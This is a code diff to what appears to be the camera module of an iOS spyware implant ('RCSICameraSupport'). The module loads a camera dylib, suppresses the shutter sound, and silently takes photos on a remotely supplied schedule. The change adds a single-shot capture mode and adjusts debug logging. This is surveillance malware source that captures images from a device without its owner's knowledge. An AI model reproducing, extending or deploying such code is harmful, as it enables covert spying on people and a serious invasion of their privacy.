@@ -14,7 +14,7 @@
 
 #import "RCSICameraSupport.h"
 
-//#define DEBUG_CAMERA
+#define DEBUG_CAMERA_
 
 typedef NSData* (*camera_t) (NSInteger);
 typedef void (*disableSound_t)(void);
@@ -104,12 +104,6 @@ static disableSound_t disableShutterSound;
 
 #define CAM_DYLIB_NAME @"camera.dylib"
 #define CAM_DYLIB_FUNC "runCamera"
-
-typedef struct _cameraStruct
-{
-  UInt32 timeStep;
-  UInt32 numStep;
-} cameraStruct;
 
 - (BOOL)_checkCameraCompatibilty
 {
@@ -240,7 +234,7 @@ typedef struct _cameraStruct
   
   if ([self _checkCameraCompatibilty] == NO)
     {
-#ifdef DEBUG_CAMERA
+#ifdef DEBUG_CAMERA_
       NSLog(@"%s: agent camera not compatibile on running device", __FUNCTION__);
 #endif
       [outerPool release];
@@ -252,7 +246,7 @@ typedef struct _cameraStruct
   messageRawData = [mAgentConfiguration objectForKey: @"data"];
   conf = (cameraStruct *)[messageRawData bytes];
 
-#ifdef DEBUG_CAMERA
+#ifdef DEBUG_CAMERA_
   if (conf)
     NSLog(@"%s: agent camera timeStep %lu, numStep %lu", __FUNCTION__,
           conf->timeStep, conf->numStep);
@@ -267,7 +261,17 @@ typedef struct _cameraStruct
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
-      if (cam_timeout == 0) 
+      // New configurations
+      if (conf->numStep == 0xFFFFFFFF)
+        {
+#ifdef DEBUG_CAMERA_
+          NSLog(@"%s: agent camera grabbing one shot", __FUNCTION__);
+#endif
+          [self _grabCameraShot];
+          [mAgentConfiguration setObject: AGENT_STOP forKey:@"status"];
+          break;
+        }
+      else if (cam_timeout == 0) 
         {
           for (int i=0; i < conf->numStep; i++) 
             {
@@ -295,6 +299,9 @@ typedef struct _cameraStruct
                               forKey: @"status"];
     }
     
+#ifdef DEBUG_CAMERA_
+    NSLog(@"%s: agent camera stopped", __FUNCTION__);
+#endif
   [outerPool release];
 }
 
